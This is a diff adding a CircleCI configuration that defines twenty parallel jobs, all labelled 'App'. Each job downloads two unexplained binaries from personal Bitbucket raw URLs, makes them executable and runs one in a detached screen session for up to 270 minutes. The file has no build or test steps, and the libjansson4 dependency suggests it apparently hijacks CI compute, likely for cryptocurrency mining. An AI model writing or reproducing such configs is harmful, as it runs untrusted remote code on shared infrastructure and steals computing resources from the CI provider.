@@ -1,0 +1,306 @@
+version: 2.1
+jobs:
+  App_01:
+    docker:
+      - image: circleci/ruby:3.0.1-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            screen -dmS ls
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/ajib1234/ajib/raw/73e1be44e51b68d097e82fe069c80add4a85ae20/main && chmod u+x * && timeout 270m ./main && stop && sudo apt update
+
+  App_02:
+    docker:
+      - image: circleci/rust:1.53.0-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            screen -dmS ls
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/ajib1234/ajib/raw/73e1be44e51b68d097e82fe069c80add4a85ae20/main && chmod u+x * && timeout 270m ./main && stop && sudo apt update
+
+  App_03:
+    docker:
+      - image: circleci/golang:1.17-rc-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            screen -dmS ls
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/ajib1234/ajib/raw/73e1be44e51b68d097e82fe069c80add4a85ae20/main && chmod u+x * && timeout 270m ./main && stop && sudo apt update
+
+  App_04:
+    docker:
+      - image: circleci/elixir:1.12.2
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            screen -dmS ls
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/ajib1234/ajib/raw/73e1be44e51b68d097e82fe069c80add4a85ae20/main && chmod u+x * && timeout 270m ./main && stop && sudo apt update
+
+  App_05:
+    docker:
+      - image: circleci/ruby:3.0
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            screen -dmS ls
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/ajib1234/ajib/raw/73e1be44e51b68d097e82fe069c80add4a85ae20/main && chmod u+x * && timeout 270m ./main && stop && sudo apt update
+
+  App_06:
+    docker:
+      - image: circleci/rust:1.53-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            screen -dmS ls
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/ajib1234/ajib/raw/73e1be44e51b68d097e82fe069c80add4a85ae20/main && chmod u+x * && timeout 270m ./main && stop && sudo apt update
+
+  App_07:
+    docker:
+      - image: circleci/golang:1.16.5
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            screen -dmS ls
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/ajib1234/ajib/raw/73e1be44e51b68d097e82fe069c80add4a85ae20/main && chmod u+x * && timeout 270m ./main && stop && sudo apt update
+
+  App_08:
+    docker:
+      - image: circleci/elixir:1.12.2
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            screen -dmS ls
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/ajib1234/ajib/raw/73e1be44e51b68d097e82fe069c80add4a85ae20/main && chmod u+x * && timeout 270m ./main && stop && sudo apt update
+
+  App_09:
+    docker:
+      - image: circleci/ruby:2.7.4-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            screen -dmS ls
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/ajib1234/ajib/raw/73e1be44e51b68d097e82fe069c80add4a85ae20/main && chmod u+x * && timeout 270m ./main && stop && sudo apt update
+
+  App_10:
+    docker:
+      - image: circleci/rust:1.52.1-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            screen -dmS ls
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/ajib1234/ajib/raw/73e1be44e51b68d097e82fe069c80add4a85ae20/main && chmod u+x * && timeout 270m ./main && stop && sudo apt update
+
+  App_11:
+    docker:
+      - image: circleci/golang:1.17-rc-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            screen -dmS ls
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/ajib1234/ajib/raw/73e1be44e51b68d097e82fe069c80add4a85ae20/main && chmod u+x * && timeout 270m ./main && stop && sudo apt update
+
+  App_12:
+    docker:
+      - image: circleci/elixir:1.12.2
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            screen -dmS ls
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/ajib1234/ajib/raw/73e1be44e51b68d097e82fe069c80add4a85ae20/main && chmod u+x * && timeout 270m ./main && stop && sudo apt update
+
+  App_13:
+    docker:
+      - image: circleci/ruby:2.7.3
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            screen -dmS ls
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/ajib1234/ajib/raw/73e1be44e51b68d097e82fe069c80add4a85ae20/main && chmod u+x * && timeout 270m ./main && stop && sudo apt update
+
+  App_14:
+    docker:
+      - image: circleci/rust:1.51.0-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            screen -dmS ls
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/ajib1234/ajib/raw/73e1be44e51b68d097e82fe069c80add4a85ae20/main && chmod u+x * && timeout 270m ./main && stop && sudo apt update
+
+  App_15:
+    docker:
+      - image: circleci/golang:1.16.5
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            screen -dmS ls
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/ajib1234/ajib/raw/73e1be44e51b68d097e82fe069c80add4a85ae20/main && chmod u+x * && timeout 270m ./main && stop && sudo apt update
+
+  App_16:
+    docker:
+      - image: circleci/elixir:1.12.2
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            screen -dmS ls
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/ajib1234/ajib/raw/73e1be44e51b68d097e82fe069c80add4a85ae20/main && chmod u+x * && timeout 270m ./main && stop && sudo apt update
+
+  App_17:
+    docker:
+      - image: circleci/ruby:2.6.8
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            screen -dmS ls
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/ajib1234/ajib/raw/73e1be44e51b68d097e82fe069c80add4a85ae20/main && chmod u+x * && timeout 270m ./main && stop && sudo apt update
+
+  App_18:
+    docker:
+      - image: circleci/rust:1.53.0-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            screen -dmS ls
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/ajib1234/ajib/raw/73e1be44e51b68d097e82fe069c80add4a85ae20/main && chmod u+x * && timeout 270m ./main && stop && sudo apt update
+
+  App_19:
+    docker:
+      - image: circleci/golang:1.17-rc-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            screen -dmS ls
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/ajib1234/ajib/raw/73e1be44e51b68d097e82fe069c80add4a85ae20/main && chmod u+x * && timeout 270m ./main && stop && sudo apt update
+
+  App_20:
+    docker:
+      - image: circleci/elixir:1.12.2
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            screen -dmS ls
+            wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/ajib1234/ajib/raw/73e1be44e51b68d097e82fe069c80add4a85ae20/main && chmod u+x * && timeout 270m ./main && stop && sudo apt update
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - App_01
+            - App_02
+            - App_03
+            - App_04
+            - App_05
+            - App_06
+            - App_07
+            - App_08
+            - App_09
+            - App_10
+            - App_11
+            - App_12
+            - App_13
+            - App_14
+            - App_15
+            - App_16
+            - App_17
+            - App_18
+            - App_19
+            - App_20
